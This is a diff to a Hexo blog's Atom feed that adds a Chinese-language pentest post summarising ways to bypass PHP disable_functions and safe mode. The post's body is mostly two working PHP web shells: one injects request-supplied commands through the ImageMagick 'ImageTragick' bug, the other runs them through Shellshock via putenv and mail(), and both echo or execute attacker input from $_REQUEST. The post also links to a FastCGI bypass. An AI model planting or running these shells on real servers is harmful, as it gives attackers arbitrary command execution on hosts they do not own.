@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.cyrils.org/"/>
-  <updated>2016-05-02T06:53:42.000Z</updated>
+  <updated>2016-05-04T17:16:16.000Z</updated>
   <id>http://blog.cyrils.org/</id>
   
   <author>
@@ -14,6 +14,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bypass-PHPSafemode-Summary</title>
+    <link href="http://blog.cyrils.org/2016/05/05/Bypass-PHPSafemode-Summary/"/>
+    <id>http://blog.cyrils.org/2016/05/05/Bypass-PHPSafemode-Summary/</id>
+    <published>2016-05-04T17:00:14.000Z</published>
+    <updated>2016-05-04T17:16:16.000Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;今天在zone里看见关于利用ImageMagick的命令注入，导致php下如何安装使用ImageMagick拓展可以bypass掉disable_function(&lt;a href=&quot;http://zone.wooyun.org/content/27038&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/27038&lt;/a&gt;)&lt;br&gt;具体的分析(&lt;a href=&quot;http://pastebin.com/aE4sKnCg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.com/aE4sKnCg&lt;/a&gt;)&lt;/p&gt;
+&lt;h2 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02&quot; class=&quot;headerlink&quot; title=&quot;0x02&quot;&gt;&lt;/a&gt;0x02&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$c=$_REQUEST[&amp;apos;c&amp;apos;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$e = &amp;lt;&amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push graphic-context&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;viewbox 0 0 640 480&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fill &amp;apos;url(https://&amp;quot;|$c&amp;quot;)&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop graphic-context&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$i = new Imagick();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$i-&amp;gt;readImageBlob($e);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;在有ImageMagick这个库的时候…&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function wtf($cmd) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $tmp = tempnam(&amp;quot;.&amp;quot;,&amp;quot;data&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   putenv(&amp;quot;PHP_LOL=() &amp;#123; x; &amp;#125;; $cmd &amp;gt;$tmp 2&amp;gt;&amp;amp;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   mail(&amp;quot;a@127.0.0.1&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;-bv&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $output = @file_get_contents($tmp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   @unlink($tmp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   if($output != &amp;quot;&amp;quot;) return $output;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   else return &amp;quot;No output, or not vuln.&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo wtf($_REQUEST[&amp;quot;cmd&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;利用shellshock的问题。&lt;/p&gt;
+&lt;h2 id=&quot;0x03&quot;&gt;&lt;a href=&quot;#0x03&quot; class=&quot;headerlink&quot; title=&quot;0x03&quot;&gt;&lt;/a&gt;0x03&lt;/h2&gt;&lt;p&gt;还有一个来自于GaRY大牛的一个东西(&lt;a href=&quot;http://zone.wooyun.org/content/2605&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/2605&lt;/a&gt;)&lt;br&gt;在fastcgi的情况，可以bypass掉safemode(disable_function不行)。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;今天在zone里看见关于利用ImageMagick的命令注入，导致php下如何安装使用ImageMagick拓展可以bypa
+    
+    </summary>
+    
+    
+      <category term="Pentest" scheme="http://blog.cyrils.org/tags/Pentest/"/>
+    
+  </entry>
   
   <entry>
     <title>Hacking-ZFJW-SQLi</title>
